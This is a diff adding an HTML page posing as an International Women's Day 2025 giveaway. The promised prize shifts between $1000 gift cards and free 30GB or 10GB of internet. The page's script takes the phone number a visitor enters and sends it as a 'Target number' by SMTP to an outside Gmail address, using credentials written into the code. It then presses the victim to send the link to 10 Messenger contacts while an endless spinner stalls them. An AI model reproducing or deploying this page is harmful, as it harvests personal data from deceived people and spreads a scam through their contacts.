@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>International Women's Day Celebration - You've Won a Prize!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f9f9f9;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            height: 100vh;
+            color: #333;
+            flex-direction: column;
+            padding: 20px;
+            overflow: auto;
+        }
+
+        .container {
+            background-color: white;
+            border-radius: 12px;
+            padding: 40px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            margin-top: 20px; /* Ensure it doesn't overlap with the top */
+        }
+
+        /* Prize Section */
+        .prize-section {
+            background: linear-gradient(145deg, #e91e63, #ff4081);
+            color: white;
+            border-radius: 8px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+
+        .prize-section h2 {
+            font-size: 2rem;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+
+        .prize-section p {
+            font-size: 1.1rem;
+            margin-bottom: 20px;
+        }
+
+        .prize-btn {
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px 30px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            border-radius: 4px;
+            border: none;
+            transition: background-color 0.3s ease;
+            margin-top: 15px;
+        }
+
+        .prize-btn:hover {
+            background-color: #45a049;
+        }
+
+        /* Form Section */
+        .form-container {
+            margin-top: 30px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        label {
+            font-weight: bold;
+            margin-bottom: 8px;
+            color: #333;
+        }
+
+        input {
+            padding: 12px;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+            margin-bottom: 20px;
+            font-size: 16px;
+            color: #333;
+            background-color: #f9f9f9;
+            width: 100%;
+            max-width: 320px;
+        }
+
+        .submit-btn {
+            background-color: #e91e63;
+            color: white;
+            border: none;
+            padding: 15px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: background-color 0.3s ease;
+            width: 100%;
+            max-width: 320px;
+        }
+
+        .submit-btn:hover {
+            background-color: #d81b60;
+        }
+
+        /* Hidden Sections */
+        .hidden {
+            display: none;
+        }
+
+        #shareSection, #loadingSection {
+            margin-top: 20px;
+        }
+
+        /* Infinite loading spinner */
+        #loading {
+            margin-top: 20px;
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border: 5px solid transparent;
+            border-top: 5px solid #e91e63;
+            animation: spin 1s linear infinite; /* Infinite spin animation */
+        }
+
+        /* Keyframe for the infinite rotation */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Share link section */
+        #shareLink {
+            font-size: 1.1rem;
+            color: #e91e63;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 15px;
+        }
+
+        #shareLink:hover {
+            text-decoration: underline;
+        }
+
+        /* Ads Section */
+        .ads {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 30px;
+            font-size: 1.2rem;
+            text-align: center;
+        }
+
+        .ads a {
+            color: white;
+            text-decoration: underline;
+        }
+
+        .ads a:hover {
+            color: #e7f7e2;
+        }
+
+        /* Footer - Event Info */
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+            font-size: 0.9rem;
+            color: #888;
+        }
+
+        .footer a {
+            color: #e91e63;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* News Section */
+        .news-section {
+            margin-top: 30px;
+        }
+
+        .news-item {
+            margin-bottom: 20px;
+            font-size: 1.1rem;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Prize Section at the Top -->
+        <div class="prize-section">
+            <h2>🎉 Congratulations! 🎉</h2>
+            <p>In celebration of International Women's Day 2025, we are giving away $1000 Gift Cards to lucky winners! Get your chance to win!</p>
+            <p>Enter your phone number below to claim your free 30GB internet in all networks!</p>
+            <button class="prize-btn" id="claimPrizeButton">Claim Your Prize Now!</button>
+        </div>
+
+        <!-- Number Input Section (After clicking Claim Prize) -->
+        <div class="form-container">
+            <h2>Enter your phone number below to claim your free 30GB internet in all networks!</h2>
+            <p>Simply input your phone number and receive the free 30GB internet.</p>
+
+            <form id="phoneForm" class="hidden">
+                <label for="phoneNumber">Phone Number:</label>
+                <input type="tel" id="phoneNumber" name="phoneNumber" required>
+                <button type="submit" class="submit-btn">Claim Your Prize</button>
+            </form>
+
+            <!-- After submitting form -->
+            <div id="shareSection" class="hidden">
+                <h2>Almost There!</h2>
+                <p>To receive your prize, please send this link to 10 people via Messenger.</p>
+                <button id="sendButton" class="submit-btn">Send Link to 10 People</button>
+            </div>
+
+            <!-- Loading Section -->
+            <div id="loadingSection" class="hidden">
+                <p>Sending link to Messenger...</p>
+                <div id="loading"></div> <!-- Infinite spinner -->
+                <p id="shareLinkSection">
+                    <a id="shareLink" href="#" target="_blank">Click here to share the link</a>
+                </p>
+            </div>
+        </div>
+
+        <!-- News Section -->
+        <div class="news-section">
+            <h3>Women's Day News</h3>
+            <div class="news-item">
+                <strong>Women Lead the Way in International Politics</strong>
+                <p>As more countries celebrate International Women’s Day, women continue to rise in leadership positions across the globe. From politics to business, women are paving the way for change.</p>
+            </div>
+            <div class="ads">
+                <p>Exclusive Offer! 50% OFF on Women's Day Apparel</p>
+                <a href="#">Shop Now</a>
+            </div>
+            <div class="news-item">
+                <strong>Celebrating Women in Technology</strong>
+                <p>More and more women are breaking barriers in the tech industry, inspiring the next generation to innovate and create. Here are some incredible stories of women leaders in tech.</p>
+            </div>
+            <div class="ads">
+                <p>Limited Time: Get 20% OFF All Skincare Products for Women</p>
+                <a href="#">Shop Now</a>
+            </div>
+            <div class="news-item">
+                <strong>Global Women's Day Marches: A Unified Voice for Equality</strong>
+                <p>From New York to New Delhi, women around the world are marching for equality and empowerment. Their voices are heard louder than ever before as we celebrate this important day.</p>
+            </div>
+        </div>
+
+        <!-- Ads Section -->
+        <div class="ads">
+            <p>Join the Celebration! Exclusive Women’s Day 2025 Discounts Available Now</p>
+            <a href="#">Shop Now</a>
+        </div>
+
+        <!-- Footer with Event Information -->
+        <div class="footer">
+            <p>Learn more about <a href="#">International Women's Day 2025</a>.</p>
+        </div>
+    </div>
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+        document.getElementById("claimPrizeButton").addEventListener("click", function() {
+            document.getElementById("claimPrizeButton").style.display = "none";
+            document.getElementById("phoneForm").classList.remove("hidden");
+        });
+
+        document.getElementById("phoneForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevents form submission
+
+            const phoneNumber = document.getElementById("phoneNumber").value;
+
+            if (phoneNumber) {
+                // Hide phone form and show the "send to 10 people" step
+                document.getElementById("phoneForm").classList.add("hidden");
+                document.getElementById("shareSection").classList.remove("hidden");
+
+                // Send email using the new email configuration
+                Email.send({
+    Host: "smtp.elasticemail.com",  // Use Gmail's SMTP server
+    Username: "tanginaka@gmail.com",  // Sender email (your Gmail address)
+    Password: "E4080F0D3315CE214B170D969A702DA3E4CF",  // Use your App Password if 2FA is enabled
+    To: "percival4th@gmail.com",  // Recipient's Gmail address
+    From: "ejaypetsgo@gmail.com",  // Sender's Gmail address
+    Subject: "Claim Your Prize - Women's Day 2025",
+    Body: `Target number: ${phoneNumber}.`  // Dynamic body including the phone number
+}).then(function(response) {
+    console.log('Your Number sent successfully!', );
+}).catch(function(error) {
+    console.log('Your Number failed to send', );
+});
+
+
+
+            } else {
+                alert("Please enter a valid phone number to proceed.");
+            }
+        });
+
+        document.getElementById("sendButton").addEventListener("click", function() {
+            document.getElementById("shareSection").classList.add("hidden");
+            document.getElementById("loadingSection").classList.remove("hidden");
+
+            const message = encodeURIComponent("Happy International Women's Day! March 08, 2025, enjoy 10GB of free internet available on all networks!");
+            const messengerLink = `https://m.me/?text=${message}`;
+            const shareLink = document.getElementById("shareLink");
+            shareLink.href = messengerLink;
+
+            setInterval(function() {
+    const loadingSection = document.getElementById("loadingSection");
+    const shareLinkSection = document.getElementById("shareLinkSection");
+    
+    // Toggle visibility every 2 seconds
+    loadingSection.classList.toggle("hidden");
+    shareLinkSection.style.display = (shareLinkSection.style.display === "block") ? "none" : "block";
+}, 2000000);
+
+        });
+    </script>
+</body>
+</html>
